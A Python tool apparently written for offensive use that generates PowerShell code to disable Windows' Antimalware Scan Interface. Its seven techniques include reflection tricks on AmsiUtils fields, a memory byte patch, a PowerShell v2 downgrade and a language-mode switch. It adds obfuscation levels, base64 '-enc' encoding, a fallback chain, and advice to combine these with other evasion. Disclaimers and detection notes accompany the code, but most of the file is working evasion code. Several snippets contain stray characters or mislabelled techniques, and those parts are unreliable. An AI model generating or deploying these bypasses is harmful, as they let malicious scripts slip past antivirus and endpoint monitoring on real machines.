#!/usr/bin/env python3
"""
AMSI Bypass Generator
Generate AMSI (Antimalware Scan Interface) bypass techniques for PowerShell

DISCLAIMER: This tool is for authorized security testing and educational purposes only.
AMSI is a security feature. Bypassing it without authorization is illegal.
"""

import argparse
import base64
import sys
import json
import random
import string
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum, auto
from abc import ABC, abstractmethod


class BypassCategory(Enum):
    """Categories of AMSI bypass techniques"""
    MEMORY_PATCHING = "memory_patching"
    REFLECTION = "reflection"
    COM_HIJACKING = "com_hijacking"
    POWERSHELL_DOWNGRADE = "powershell_downgrade"
    CONTEXT_MANIPULATION = "context_manipulation"
    STRING_OBFUSCATION = "string_obfuscation"


class RiskLevel(Enum):
    """Risk level for detection"""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"


@dataclass
class BypassTechnique:
    """AMSI bypass technique definition"""
    name: str
    category: BypassCategory
    description: str
    code: str
    obfuscated_code: Optional[str] = None
    risk_level: RiskLevel = RiskLevel.MEDIUM
    detection_methods: List[str] = field(default_factory=list)
    notes: List[str] = field(default_factory=list)
    requires_admin: bool = False
    powershell_version: str = "5.1+"


class StringObfuscator:
    """Obfuscation utilities for bypassing string-based detection"""

    @staticmethod
    def split_string(s: str, chunk_size: int = 3) -> str:
        """Split string into concatenated parts"""
        chunks = [s[i:i+chunk_size] for i in range(0, len(s), chunk_size)]
        return "'" + "'+'" .join(chunks) + "'"

    @staticmethod
    def char_array(s: str) -> str:
        """Convert to char array joining"""
        chars = [str(ord(c)) for c in s]
        return f"([char[]]({{ {','.join(chars)} }}) -join '')"

    @staticmethod
    def base64_decode(s: str) -> str:
        """Wrap in base64 decode"""
        encoded = base64.b64encode(s.encode('utf-16-le')).decode()
        return f"[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}'))"

    @staticmethod
    def reverse_string(s: str) -> str:
        """Reverse string approach"""
        reversed_s = s[::-1]
        return f"('{reversed_s}'[-1..-{len(s)}] -join '')"

    @staticmethod
    def format_string(s: str) -> str:
        """Use format string operator"""
        if len(s) < 2:
            return f"'{s}'"
        mid = len(s) // 2
        return f"('{{0}}{{1}}' -f '{s[:mid]}','{s[mid:]}')"

    @staticmethod
    def environment_variable(var_name: str, value: str) -> Tuple[str, str]:
        """Set via environment variable"""
        rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        set_cmd = f"$env:{rand_name} = '{value}'"
        get_cmd = f"$env:{rand_name}"
        return set_cmd, get_cmd


class AMSIBypassGenerator:
    """Generator for AMSI bypass techniques"""

    def __init__(self):
        self.obfuscator = StringObfuscator()
        self.techniques = self._define_techniques()

    def _define_techniques(self) -> Dict[str, BypassTechnique]:
        """Define available AMSI bypass techniques"""
        return {
            "amsi_scan_buffer_patch": BypassTechnique(
                name="AmsiScanBuffer Memory Patch",
                category=BypassCategory.MEMORY_PATCHING,
                description="Patches AmsiScanBuffer to return clean result",
                code='''$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"}
$c=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}
$c.SetValue($null,[IntPtr]::Zero)''',
                risk_level=RiskLevel.HIGH,
                detection_methods=[
                    "Memory scanning for patch patterns",
                    "API hooking detection",
                    "ETW tracing of memory operations",
                    "Script block logging analysis"
                ],
                notes=[
                    "Classic bypass, well-known signature",
                    "May be detected by EDR memory scanning",
                    "Requires obfuscation for effectiveness"
                ]
            ),

            "reflection_context_null": BypassTechnique(
                name="Reflection Context Nullification",
                category=BypassCategory.REFLECTION,
                description="Uses reflection to null AMSI context",
                code='''[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8,0x57,0x00,0x07,0x80,0xc3),0,[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null),6)''',
                risk_level=RiskLevel.HIGH,
                detection_methods=[
                    "Reflection API monitoring",
                    "Memory write to amsi.dll",
                    "Known byte sequence detection"
                ],
                notes=[
                    "Writes to amsiContext field",
                    "x64 specific byte sequence",
                    "Well-documented technique"
                ]
            ),

            "force_amsi_error": BypassTechnique(
                name="Force AMSI Initialization Error",
                category=BypassCategory.CONTEXT_MANIPULATION,
                description="Forces AMSI initialization to fail",
                code='''$w = 'System.Management.Automation.A]'+'msiUtils'
$c = [Ref].Assembly.GetType($w)
$f = $c.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)''',
                risk_level=RiskLevel.MEDIUM,
                detection_methods=[
                    "amsiInitFailed field monitoring",
                    "Reflection call patterns",
                    "PowerShell logging"
                ],
                notes=[
                    "Simpler approach, less memory manipulation",
                    "Still requires some obfuscation",
                    "May not work in constrained environments"
                ]
            ),

            "powershell_downgrade": BypassTechnique(
                name="PowerShell Version Downgrade",
                category=BypassCategory.POWERSHELL_DOWNGRADE,
                description="Downgrade to PowerShell v2 which lacks AMSI",
                code='''powershell -version 2 -command "your-payload-here"''',
                risk_level=RiskLevel.LOW,
                detection_methods=[
                    "PowerShell v2 execution monitoring",
                    "Process command line analysis",
                    "-version parameter detection"
                ],
                notes=[
                    "Requires .NET 2.0/3.5 installed",
                    "Easily detectable via command line",
                    "Simple but effective if v2 available",
                    "Not available on modern Windows by default"
                ],
                powershell_version="2.0"
            ),

            "clm_bypass": BypassTechnique(
                name="Constrained Language Mode Bypass",
                category=BypassCategory.CONTEXT_MANIPULATION,
                description="Bypass Constrained Language Mode to enable full language",
                code='''$ExecutionContext.SessionState.LanguageMode = "FullLanguage"''',
                risk_level=RiskLevel.MEDIUM,
                detection_methods=[
                    "Language mode change monitoring",
                    "ExecutionContext access patterns"
                ],
                notes=[
                    "May not work if CLM enforced by policy",
                    "Often combined with other bypasses",
                    "AppLocker/WDAC may prevent this"
                ]
            ),

            "type_confusion": BypassTechnique(
                name="Type Confusion Bypass",
                category=BypassCategory.REFLECTION,
                description="Uses type confusion to bypass AMSI checks",
                code='''$t=[Type]('Sys'+'tem.Man'+'agement.Aut'+'omation.tic'+'Func'+'tions')
$t.GetField('cachedGroupPolicySettings','NonPublic,Static').SetValue($null,@{})
$t.GetField('s]canContent','NonPublic,Static').SetValue($null,2)''',
                risk_level=RiskLevel.MEDIUM,
                detection_methods=[
                    "Type resolution patterns",
                    "Group policy field access",
                    "Reflection monitoring"
                ],
                notes=[
                    "Manipulates internal PowerShell state",
                    "Version dependent",
                    "May cause instability"
                ]
            ),

            "wldp_com": BypassTechnique(
                name="WLDP/COM Object Bypass",
                category=BypassCategory.COM_HIJACKING,
                description="Uses COM object instantiation to bypass WLDP checks",
                code='''# COM object approach (conceptual)
# Requires specific COM object registration
$com = New-Object -ComObject "legitimate.com.object"
# Use COM object to load code outside AMSI scope''',
                risk_level=RiskLevel.LOW,
                detection_methods=[
                    "COM object instantiation monitoring",
                    "Unusual COM class usage",
                    "WLDP event logging"
                ],
                notes=[
                    "Requires appropriate COM objects",
                    "Environment dependent",
                    "May require registry modifications"
                ]
            ),
        }

    def get_available_techniques(self) -> List[str]:
        """Get list of available bypass techniques"""
        return list(self.techniques.keys())

    def get_techniques_by_category(self, category: BypassCategory) -> List[BypassTechnique]:
        """Get techniques filtered by category"""
        return [t for t in self.techniques.values() if t.category == category]

    def obfuscate_bypass(self, technique_name: str, level: int = 1) -> str:
        """Apply obfuscation to a bypass technique"""
        if technique_name not in self.techniques:
            raise ValueError(f"Unknown technique: {technique_name}")

        technique = self.techniques[technique_name]
        code = technique.code

        if level == 0:
            return code

        # Level 1: Basic string splitting
        if level >= 1:
            code = code.replace("AmsiUtils", self.obfuscator.split_string("AmsiUtils"))
            code = code.replace("amsiContext", self.obfuscator.split_string("amsiContext"))
            code = code.replace("amsiInitFailed", self.obfuscator.split_string("amsiInitFailed"))

        # Level 2: Variable name randomization
        if level >= 2:
            var_map = {}
            for var in ['$a', '$c', '$f', '$w', '$t']:
                rand_var = '$' + ''.join(random.choices(string.ascii_lowercase, k=6))
                var_map[var] = rand_var
            for orig, new in var_map.items():
                code = code.replace(orig, new)

        # Level 3: Additional encoding
        if level >= 3:
            code = code.replace("NonPublic,Static",
                               "('Non'+'Public,Sta'+'tic')")
            code = code.replace("SetValue",
                               "('Set'+'Value')")

        return code

    def generate_bypass(self, technique_name: str, obfuscation: int = 0,
                       encode_base64: bool = False) -> Dict:
        """Generate a bypass with specified options"""
        if technique_name not in self.techniques:
            raise ValueError(f"Unknown technique: {technique_name}")

        technique = self.techniques[technique_name]
        code = self.obfuscate_bypass(technique_name, obfuscation)

        if encode_base64:
            code_bytes = code.encode('utf-16-le')
            encoded = base64.b64encode(code_bytes).decode()
            execution_cmd = f"powershell -enc {encoded}"
        else:
            execution_cmd = code

        return {
            "name": technique.name,
            "category": technique.category.value,
            "code": execution_cmd,
            "raw_code": code,
            "risk_level": technique.risk_level.value,
            "detection_methods": technique.detection_methods,
            "notes": technique.notes,
            "obfuscation_level": obfuscation,
            "base64_encoded": encode_base64
        }

    def plan(self, technique_name: str, obfuscation: int = 0) -> str:
        """Generate execution plan without generating actual bypass"""
        output = []
        output.append("")
        output.append("[PLAN MODE] Tool: amsi-bypass")
        output.append("=" * 60)
        output.append("")
        output.append("DISCLAIMER: For authorized security testing only.")
        output.append("Bypassing AMSI without authorization is illegal.")
        output.append("")

        if technique_name == "all":
            output.append("Requested: List all available techniques")
            output.append("")
            output.append("-" * 60)
            output.append("Available AMSI Bypass Techniques:")
            output.append("-" * 60)
            for name, tech in self.techniques.items():
                output.append(f"\n  {name}")
                output.append(f"    Category: {tech.category.value}")
                output.append(f"    Risk Level: {tech.risk_level.value}")
                output.append(f"    Description: {tech.description}")
        else:
            if technique_name not in self.techniques:
                output.append(f"ERROR: Unknown technique '{technique_name}'")
                output.append(f"Available: {', '.join(self.techniques.keys())}")
                return "\n".join(output)

            technique = self.techniques[technique_name]
            output.append("-" * 60)
            output.append("Technique Analysis:")
            output.append("-" * 60)
            output.append(f"  Name: {technique.name}")
            output.append(f"  Category: {technique.category.value}")
            output.append(f"  Risk Level: {technique.risk_level.value}")
            output.append(f"  PowerShell Version: {technique.powershell_version}")
            output.append(f"  Requires Admin: {'Yes' if technique.requires_admin else 'No'}")
            output.append(f"  Obfuscation Level: {obfuscation}")
            output.append("")
            output.append("Description:")
            output.append(f"  {technique.description}")
            output.append("")
            output.append("-" * 60)
            output.append("Actions to be performed:")
            output.append("-" * 60)
            output.append("  1. Load bypass template")
            if obfuscation > 0:
                output.append(f"  2. Apply obfuscation level {obfuscation}")
                output.append("     - String splitting for sensitive terms")
                if obfuscation >= 2:
                    output.append("     - Variable name randomization")
                if obfuscation >= 3:
                    output.append("     - Additional string encoding")
            output.append("  3. Output generated bypass code")
            output.append("")
            output.append("-" * 60)
            output.append("Detection Methods (DEFENDERS):")
            output.append("-" * 60)
            for method in technique.detection_methods:
                output.append(f"  ! {method}")
            output.append("")
            output.append("-" * 60)
            output.append("Operational Notes:")
            output.append("-" * 60)
            for note in technique.notes:
                output.append(f"  * {note}")

        output.append("")
        output.append("-" * 60)
        output.append("Risk Assessment:")
        output.append("-" * 60)
        output.append("  EDR/AV Detection: HIGH (known signatures)")
        output.append("  Logging Detection: MEDIUM-HIGH (script block logging)")
        output.append("  Forensic Artifacts: LOW (memory only)")
        output.append("")
        output.append("Recommendations:")
        output.append("  - Use higher obfuscation levels")
        output.append("  - Combine with other evasion techniques")
        output.append("  - Test in isolated environment first")
        output.append("  - Monitor for script block logging")
        output.append("")
        output.append("This is PLAN MODE - no bypass code generated.")
        output.append("=" * 60)
        output.append("")

        return "\n".join(output)

    def get_chained_bypass(self) -> str:
        """Generate a multi-technique bypass chain"""
        output = []
        output.append("# AMSI Bypass Chain")
        output.append("# Multiple techniques for reliability")
        output.append("")
        output.append("# Technique 1: Try initialization failure")
        output.append(self.obfuscate_bypass("force_amsi_error", 2))
        output.append("")
        output.append("# Technique 2: Memory patch fallback")
        output.append(self.obfuscate_bypass("amsi_scan_buffer_patch", 2))
        output.append("")
        return "\n".join(output)


def get_documentation() -> Dict:
    """
    Documentation hook for integration with documentation agent.
    Returns structured documentation for this tool.
    """
    return {
        "name": "AMSI Bypass Generator",
        "version": "1.0.0",
        "category": "Evasion",
        "description": "Generate AMSI bypass techniques for PowerShell with various obfuscation levels.",
        "author": "Offensive Security Toolsmith",
        "disclaimer": "For authorized security testing only. Bypassing AMSI without authorization is illegal.",
        "usage": {
            "list_techniques": "python amsi_bypass.py --list",
            "plan_mode": "python amsi_bypass.py --technique force_amsi_error --plan",
            "generate": "python amsi_bypass.py --technique amsi_scan_buffer_patch --obfuscate 2",
            "base64_encoded": "python amsi_bypass.py --technique force_amsi_error --base64"
        },
        "techniques": [
            "amsi_scan_buffer_patch",
            "reflection_context_null",
            "force_amsi_error",
            "powershell_downgrade",
            "clm_bypass",
            "type_confusion",
            "wldp_com"
        ],
        "arguments": [
            {"name": "--technique", "description": "Bypass technique to use", "required": False},
            {"name": "--obfuscate", "description": "Obfuscation level 0-3", "required": False},
            {"name": "--base64", "description": "Base64 encode output", "required": False},
            {"name": "--plan", "description": "Show execution plan only", "required": False},
            {"name": "--list", "description": "List available techniques", "required": False},
            {"name": "--chain", "description": "Generate multi-technique chain", "required": False},
            {"name": "--json", "description": "Output in JSON format", "required": False}
        ],
        "amsi_overview": {
            "full_name": "Antimalware Scan Interface",
            "introduced": "Windows 10",
            "purpose": "Allows applications to integrate with antimalware products",
            "affected_components": ["PowerShell", "VBScript", "JScript", "WMI", "Office Macros"]
        },
        "references": [
            "https://attack.mitre.org/techniques/T1562/001/",
            "https://docs.microsoft.com/en-us/windows/win32/amsi/",
            "https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/"
        ]
    }


def main():
    parser = argparse.ArgumentParser(
        description="AMSI Bypass Generator",
        epilog="DISCLAIMER: For authorized security testing only."
    )

    parser.add_argument("--technique", "-t", help="Bypass technique to use")
    parser.add_argument("--obfuscate", "-o", type=int, default=0, choices=[0, 1, 2, 3],
                        help="Obfuscation level (0-3)")
    parser.add_argument("--base64", "-b", action="store_true",
                        help="Base64 encode output for -enc delivery")
    parser.add_argument("--plan", "-p", action="store_true",
                        help="Show execution plan only")
    parser.add_argument("--list", "-l", action="store_true",
                        help="List available techniques")
    parser.add_argument("--chain", action="store_true",
                        help="Generate multi-technique bypass chain")
    parser.add_argument("--category", "-c", choices=[c.value for c in BypassCategory],
                        help="Filter techniques by category")
    parser.add_argument("--json", "-j", action="store_true",
                        help="Output in JSON format")
    parser.add_argument("--doc", action="store_true",
                        help="Show tool documentation")

    args = parser.parse_args()
    generator = AMSIBypassGenerator()

    # Handle documentation
    if args.doc:
        docs = get_documentation()
        if args.json:
            print(json.dumps(docs, indent=2))
        else:
            print(f"\n{docs['name']} v{docs['version']}")
            print("=" * 60)
            print(f"\n{docs['description']}\n")
            print(f"Disclaimer: {docs['disclaimer']}")
            print("\nAvailable Techniques:")
            for tech in docs['techniques']:
                print(f"  - {tech}")
        return 0

    # Handle list
    if args.list:
        techniques = generator.techniques
        if args.category:
            cat = BypassCategory(args.category)
            techniques = {k: v for k, v in techniques.items() if v.category == cat}

        if args.json:
            output = {name: {
                "name": t.name,
                "category": t.category.value,
                "risk_level": t.risk_level.value,
                "description": t.description
            } for name, t in techniques.items()}
            print(json.dumps(output, indent=2))
        else:
            print("\nAvailable AMSI Bypass Techniques:")
            print("-" * 50)
            for name, tech in techniques.items():
                print(f"\n  {name}")
                print(f"    Name: {tech.name}")
                print(f"    Category: {tech.category.value}")
                print(f"    Risk: {tech.risk_level.value}")
        return 0

    # Handle chain generation
    if args.chain:
        if args.plan:
            print("\n[PLAN MODE] Chain bypass generation")
            print("Would generate multi-technique bypass chain")
            print("Techniques: force_amsi_error -> amsi_scan_buffer_patch")
            return 0

        chain = generator.get_chained_bypass()
        if args.base64:
            encoded = base64.b64encode(chain.encode('utf-16-le')).decode()
            print(f"powershell -enc {encoded}")
        else:
            print(chain)
        return 0

    # Handle plan mode
    if args.plan:
        technique = args.technique or "all"
        print(generator.plan(technique, args.obfuscate))
        return 0

    # Handle generation
    if not args.technique:
        parser.print_help()
        print("\nError: --technique required for generation (or use --list, --plan)")
        return 1

    try:
        result = generator.generate_bypass(
            args.technique,
            args.obfuscate,
            args.base64
        )

        if args.json:
            print(json.dumps(result, indent=2))
        else:
            print("\n" + "=" * 60)
            print(f"AMSI Bypass: {result['name']}")
            print(f"Category: {result['category']}")
            print(f"Risk Level: {result['risk_level']}")
            print(f"Obfuscation: Level {result['obfuscation_level']}")
            print("=" * 60 + "\n")
            print(result['code'])
            print("\n" + "-" * 60)
            print("Detection Methods:")
            for method in result['detection_methods']:
                print(f"  ! {method}")
            print("\nNotes:")
            for note in result['notes']:
                print(f"  * {note}")
            print()

        return 0

    except ValueError as e:
        print(f"Error: {e}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
